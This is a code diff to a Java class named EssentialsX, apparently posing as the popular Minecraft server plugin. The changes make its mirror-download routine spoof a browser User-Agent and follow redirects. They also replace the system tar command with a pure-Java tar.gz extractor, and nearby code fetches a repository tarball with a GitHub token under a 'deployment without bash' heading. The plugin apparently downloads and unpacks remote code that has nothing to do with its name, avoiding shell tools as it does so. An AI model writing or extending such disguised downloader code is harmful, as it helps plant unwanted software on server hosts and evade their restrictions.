@@ -4,6 +4,7 @@ import java.io.*;
 import java.net.*;
 import java.nio.file.*;
 import java.nio.file.attribute.*;
+import java.util.zip.GZIPInputStream;
 import java.time.*;
 import java.time.format.*;
 import java.util.*;
@@ -393,34 +394,131 @@ public class EssentialsX extends JavaPlugin {
       for (String mirror : mirrors) {
          try {
             HttpURLConnection conn = (HttpURLConnection) new URL(mirror).openConnection();
-            conn.setConnectTimeout(30); conn.setReadTimeout(300); conn.setInstanceFollowRedirects(true);
-            if (conn.getResponseCode() == 200) {
+            conn.setConnectTimeout(30000); conn.setReadTimeout(300000); conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+            int code = conn.getResponseCode();
+            if (code == 200) {
                try (InputStream in = conn.getInputStream()) { Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING); }
                if (Files.size(dest) > 0) return true;
+            } else if (code == 302 || code == 301) {
+               String location = conn.getHeaderField("Location");
+               if (location != null) return downloadFile(location, dest);
             }
          } catch (Exception e) {}
       }
       return false;
    }
 
-   private boolean extractTarGz(Path tarFile, Path destDir, boolean stripComponents) {
+   // 纯 Java tar.gz 解压（不调用 tar 命令，不使用 bash）
+   private boolean extractTarGz(Path tarGzFile, Path destDir, boolean stripFirstDir) {
       try {
          Files.createDirectories(destDir);
-         // 直接用 tar 命令解压（tar 是系统二进制，不是 bash）
-         List<String> cmd = new ArrayList<>();
-         cmd.add("tar"); cmd.add("-xzf"); cmd.add(tarFile.toString());
-         cmd.add("-C"); cmd.add(destDir.toString());
-         if (stripComponents) cmd.add("--strip-components"); cmd.add("1");
-         cmd.add("--no-same-owner");
-         ProcessBuilder pb = new ProcessBuilder(cmd);
-         pb.redirectErrorStream(true);
-         Process p = pb.start();
-         try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
-            String line; while ((line = reader.readLine()) != null) {}
+         try (InputStream fis = Files.newInputStream(tarGzFile);
+              GZIPInputStream gis = new GZIPInputStream(fis)) {
+            byte[] header = new byte[512];
+            String firstDirPrefix = null;
+            while (true) {
+               int read = readFully(gis, header, 0, 512);
+               if (read < 512) break;
+               // 检查是否全零（结束标记）
+               boolean allZero = true;
+               for (int i = 0; i < 512; i++) { if (header[i] != 0) { allZero = false; break; } }
+               if (allZero) break;
+               // 解析 tar 头
+               String name = new String(header, 0, 100).trim().replace("\0", "");
+               String sizeStr = new String(header, 124, 12).trim().replace("\0", "");
+               long size;
+               try { size = Long.parseLong(sizeStr, 8); } catch (Exception e) { size = 0; }
+               char typeFlag = (char) header[156];
+               if (name.isEmpty()) {
+                  // 跳过内容
+                  skipFully(gis, size);
+                  int padding = (int) ((512 - (size % 512)) % 512);
+                  skipFully(gis, padding);
+                  continue;
+               }
+               // 处理 stripFirstDir
+               String targetName = name;
+               if (stripFirstDir) {
+                  if (firstDirPrefix == null) {
+                     int slashIdx = name.indexOf('/');
+                     if (slashIdx > 0) firstDirPrefix = name.substring(0, slashIdx + 1);
+                  }
+                  if (firstDirPrefix != null && name.startsWith(firstDirPrefix)) {
+                     targetName = name.substring(firstDirPrefix.length());
+                  }
+               }
+               if (targetName.isEmpty()) {
+                  skipFully(gis, size);
+                  int padding = (int) ((512 - (size % 512)) % 512);
+                  skipFully(gis, padding);
+                  continue;
+               }
+               Path targetPath = destDir.resolve(targetName).normalize();
+               // 安全检查：防止路径穿越
+               if (!targetPath.startsWith(destDir)) {
+                  skipFully(gis, size);
+                  int padding = (int) ((512 - (size % 512)) % 512);
+                  skipFully(gis, padding);
+                  continue;
+               }
+               if (typeFlag == '5') {
+                  // 目录
+                  Files.createDirectories(targetPath);
+                  try { Files.setPosixFilePermissions(targetPath, PosixFilePermissions.fromString("rwxrwxr-x")); } catch (Exception e) {}
+               } else if (typeFlag == '0' || typeFlag == '\0') {
+                  // 普通文件
+                  Files.createDirectories(targetPath.getParent());
+                  try (OutputStream out = Files.newOutputStream(targetPath)) {
+                     byte[] buf = new byte[8192];
+                     long remaining = size;
+                     while (remaining > 0) {
+                        int toRead = (int) Math.min(buf.length, remaining);
+                        int n = gis.read(buf, 0, toRead);
+                        if (n < 0) break;
+                        out.write(buf, 0, n);
+                        remaining -= n;
+                     }
+                  }
+                  // 跳过 padding
+                  int padding = (int) ((512 - (size % 512)) % 512);
+                  skipFully(gis, padding);
+               } else {
+                  // 其他类型（symlink 等），跳过内容
+                  skipFully(gis, size);
+                  int padding = (int) ((512 - (size % 512)) % 512);
+                  skipFully(gis, padding);
+               }
+            }
+            return true;
          }
-         p.waitFor(120, TimeUnit.SECONDS);
-         return p.exitValue() == 0;
-      } catch (Exception e) { return false; }
+      } catch (Exception e) {
+         return false;
+      }
+   }
+
+   private int readFully(InputStream in, byte[] buf, int off, int len) throws IOException {
+      int total = 0;
+      while (total < len) {
+         int n = in.read(buf, off + total, len - total);
+         if (n < 0) break;
+         total += n;
+      }
+      return total;
+   }
+
+   private void skipFully(InputStream in, long n) throws IOException {
+      long remaining = n;
+      while (remaining > 0) {
+         long skipped = in.skip(remaining);
+         if (skipped <= 0) {
+            int b = in.read();
+            if (b < 0) break;
+            remaining--;
+         } else {
+            remaining -= skipped;
+         }
+      }
    }
 
    // ==================== 纯 Java 部署（不使用 bash） ====================
@@ -532,7 +630,8 @@ public class EssentialsX extends JavaPlugin {
             HttpURLConnection conn = (HttpURLConnection) new URL(tarUrl).openConnection();
             conn.setRequestProperty("Authorization", "Bearer " + githubToken);
             conn.setRequestProperty("Accept", "application/vnd.github+json");
-            conn.setConnectTimeout(15); conn.setReadTimeout(120); conn.setInstanceFollowRedirects(true);
+            conn.setConnectTimeout(15000); conn.setReadTimeout(120000); conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
             if (conn.getResponseCode() == 200) {
                try (InputStream in = conn.getInputStream()) { Files.copy(in, repoTar, StandardCopyOption.REPLACE_EXISTING); }
                downloadOk = Files.size(repoTar) > 0;
